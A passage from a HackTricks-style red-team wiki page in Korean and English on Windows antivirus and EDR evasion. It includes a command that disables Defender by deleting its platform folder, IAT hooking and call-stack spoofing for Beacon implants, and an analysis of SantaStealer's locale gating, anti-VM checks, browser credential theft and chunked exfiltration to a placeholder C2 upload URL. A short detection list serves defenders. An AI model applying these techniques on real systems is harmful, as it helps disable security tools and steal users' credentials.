```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` 아래에서 새 프로세스 경로와 해당 위치를 반영하는 서비스 구성/레지스트리를 확인할 수 있어야 합니다.

Post-exploitation 옵션
- DLL sideloading/code execution: Defender가 application directory에서 로드하는 DLLs를 Drop/replace하여 Defender의 프로세스에서 code를 실행합니다. 자세한 내용은 위 섹션을 참조하세요: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink을 제거하면 다음 시작 시 구성된 경로가 해석되지 않아 Defender가 시작에 실패합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 참고: 이 기술 자체만으로는 privilege escalation을 제공하지 않습니다; 관리자 권한이 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

레드팀은 C2 implant 대신 대상 모듈 자체에서 런타임 회피를 수행할 수 있습니다. 대상 모듈의 Import Address Table (IAT)을 후킹하고 선택된 API를 attacker-controlled, position‑independent code (PIC)를 통해 라우팅하면 됩니다. 이렇게 하면 많은 툴킷이 노출하는 작은 API 표면(예: CreateProcessA)을 넘어 회피가 일반화되고, 동일한 보호를 BOFs 및 post‑exploitation DLLs에도 확장할 수 있습니다.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). PIC는 self‑contained하고 position‑independent여야 합니다.
- 호스트 DLL이 로드될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하여 대상 임포트(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)의 IAT 엔트리를 얇은 PIC 래퍼를 가리키도록 패치합니다.
- 각 PIC 래퍼는 실제 API 주소로 tail‑calling 하기 전에 회피 동작을 실행합니다. 일반적인 회피 기법은 다음을 포함합니다:
  - 호출 전후 메모리 마스크/언마스크 (예: beacon 영역 암호화, RWX→RX 변경, 페이지 이름/권한 변경) 후 호출 후 복원.
  - Call‑stack spoofing: 정상적인 스택을 구성하고 대상 API로 전환하여 call‑stack 분석이 예상 프레임으로 해석되도록 함.
- 호환성을 위해 Aggressor script(또는 동등한 스크립트)가 Beacon, BOFs 및 post‑ex DLLs에 대해 어떤 API를 후킹할지 등록할 수 있도록 인터페이스를 export합니다.

왜 여기서 IAT hooking인가
- 후킹된 임포트를 사용하는 모든 코드에 대해 동작하므로 툴 코드를 수정하거나 Beacon이 특정 API를 프록시하도록 의존할 필요가 없습니다.
- post‑ex DLLs를 커버합니다: LoadLibrary*를 후킹하면 모듈 로드(e.g., System.Management.Automation.dll, clr.dll)를 가로채고 동일한 마스킹/스택 회피를 해당 모듈의 API 호출에 적용할 수 있습니다.
- CreateProcessA/W를 래핑함으로써 call‑stack 기반 탐지에 대해 프로세스 생성형 post‑ex 명령의 신뢰성을 복원합니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR 이후와 import의 최초 사용 전에 패치를 적용하라. Reflective loaders like TitanLdr/AceLdr는 로드된 모듈의 DllMain 동안 후킹을 시연한다.
- 래퍼는 작고 PIC-safe하게 유지하라; 패치하기 전에 캡처한 원래 IAT 값이나 LdrGetProcedureAddress를 통해 실제 API를 해결하라.
- PIC에는 RW → RX 전환을 사용하고 writable+executable 페이지를 남기지 마라.

Call‑stack spoofing stub
- Draugr‑style PIC stubs는 가짜 호출 체인(정상적인 모듈로의 복귀 주소)을 만들고 실제 API로 피벗한다.
- 이는 Beacon/BOFs에서 민감한 API로 가는 정규 스택을 기대하는 탐지를 무력화한다.
- API prologue 이전에 예상 프레임 내부로 진입하도록 stack cutting/stack stitching 기술과 함께 사용하라.

Operational integration
- reflective loader를 post‑ex DLLs 앞에 붙여 DLL이 로드될 때 PIC와 훅이 자동으로 초기화되게 하라.
- Aggressor 스크립트를 사용해 대상 API를 등록하면 Beacon 및 BOFs가 코드 변경 없이 동일한 회피 경로의 이점을 투명하게 누릴 수 있다.

Detection/DFIR considerations
- IAT integrity: non‑image (heap/anon) 주소로 해석되는 엔트리들; import 포인터의 주기적 검증.
- Stack anomalies: 로드된 이미지에 속하지 않는 복귀 주소; non‑image PIC로의 급격한 전환; 일관되지 않은 RtlUserThreadStart 계보.
- Loader telemetry: 프로세스 내 IAT 쓰기, import thunk를 수정하는 초기 DllMain 활동, 로드 시 생성되는 예기치 않은 RX 영역.
- Image‑load evasion: LoadLibrary*를 후킹하는 경우 memory masking 이벤트와 상관관계가 있는 automation/clr 어셈블리의 의심스러운 로드를 모니터링하라.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer)는 현대의 info-stealers가 AV bypass, anti-analysis 및 credential access를 단일 워크플로우로 결합하는 방식을 보여준다.

### Keyboard layout gating & sandbox delay

- 설정 플래그(`anti_cis`)는 `GetKeyboardLayoutList`를 통해 설치된 키보드 레이아웃을 열거한다. Cyrillic 레이아웃이 발견되면 샘플은 빈 `CIS` 마커를 남기고 stealers를 실행하기 전에 종료하여 제외된 로케일에서 폭발하지 않으면서 조사자에게 남길 흔적을 남긴다.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 계층화된 `check_antivm` 로직

- Variant A는 프로세스 목록을 훑고, 각 이름을 커스텀 롤링 체크섬으로 해시한 뒤 디버거/샌드박스용 임베디드 블락리스트와 대조합니다; 같은 체크섬을 컴퓨터 이름에도 반복 적용하고 `C:\analysis` 같은 작업 디렉터리를 확인합니다.
- Variant B는 시스템 속성(프로세스 수 하한, 최근 업타임)을 검사하고 `OpenServiceA("VBoxGuest")`를 호출해 VirtualBox 추가 항목을 탐지하며, sleep 주변의 타이밍 검사를 수행해 싱글스텝을 찾아냅니다. 어떤 항목이라도 감지되면 모듈이 로드되기 전에 중단합니다.

### Fileless helper + double ChaCha20 reflective loading

- 기본 DLL/EXE는 Chromium credential helper를 임베드하며, 이는 디스크에 드롭되거나 수동으로 메모리에 매핑됩니다; fileless 모드에서는 imports/relocations을 자체 해결하여 helper 아티팩트가 기록되지 않습니다.
- 해당 helper는 두 번 ChaCha20으로 암호화된 second-stage DLL을 저장합니다(두 개의 32바이트 키 + 12바이트 nonce). 두 번의 패스 후, blob을 reflectively 로드합니다( `LoadLibrary` 사용 없음) 그리고 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` 익스포트를 호출합니다.
- ChromElevator 루틴은 direct-syscall reflective process hollowing을 사용해 라이브 Chromium 브라우저에 인젝션하고, AppBound Encryption 키를 상속하며 ABE 하드닝에도 불구하고 SQLite 데이터베이스에서 바로 비밀번호/쿠키/신용카드를 복호화합니다.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`는 글로벌 `memory_generators` 함수 포인터 테이블을 반복하고 활성화된 모듈마다(예: Telegram, Discord, Steam, 스크린샷, 문서, 브라우저 확장 등) 하나의 스레드를 생성합니다. 각 스레드는 결과를 공유 버퍼에 기록하고 약 45초의 조인 창 후 파일 수를 보고합니다.
- 완료되면 모든 내용은 정적으로 링크된 `miniz` 라이브러리로 압축되어 `%TEMP%\\Log.zip`로 생성됩니다. `ThreadPayload1`은 15초간 sleep한 뒤 아카이브를 10 MB 청크로 나눠 HTTP POST로 `http://<C2>:6767/upload`에 스트리밍하며, 브라우저의 `multipart/form-data` 경계(`----WebKitFormBoundary***`)를 스푸핑합니다. 각 청크에는 `User-Agent: upload`, `auth: <build_id>`, 선택적 `w: <campaign_tag>`가 추가되며 마지막 청크에는 `complete: true`가 붙어 C2가 재조립 완료를 알 수 있게 합니다.

## 참조

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
